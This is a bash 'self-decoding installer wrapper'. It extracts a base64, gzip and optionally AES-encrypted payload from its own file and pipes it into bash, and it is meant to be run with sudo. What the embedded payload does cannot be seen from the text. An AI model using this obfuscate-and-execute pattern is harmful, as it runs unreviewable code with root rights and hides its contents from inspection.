#!/usr/bin/env bash
# Self-decoding installer wrapper
# - Contains base64(+gzip) payload, optionally AES-256-CBC encrypted
# - Decodes, optionally decrypts, ungzips, then execs payload under bash
#
# Runtime:
#   sudo bash ./THIS_SCRIPT.sh
#
set -euo pipefail

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2
  exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi

  # Python/zlib fallback
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi

  echo "No gzip decompressor found." >&2
  exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2
    exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 here must match obfuscator mode
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected below
OBF_ENCRYPTED="0"

# Payload markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

extract_payload() {
  # Pull only the lines between markers
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run_payload() {
  # Decode pipeline:
  #   base64 -> (optional AES decrypt) -> gunzip -> bash -s --
  #
  # NOTE: we FORCE bash here. That fixes 'set -o pipefail' problems
  #       in the original installer script.
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /usr/bin/env bash -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /usr/bin/env bash -s -- "$@"
  fi
}

run_payload "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
PAAA
__OBF_B64_PAYLOAD_END__
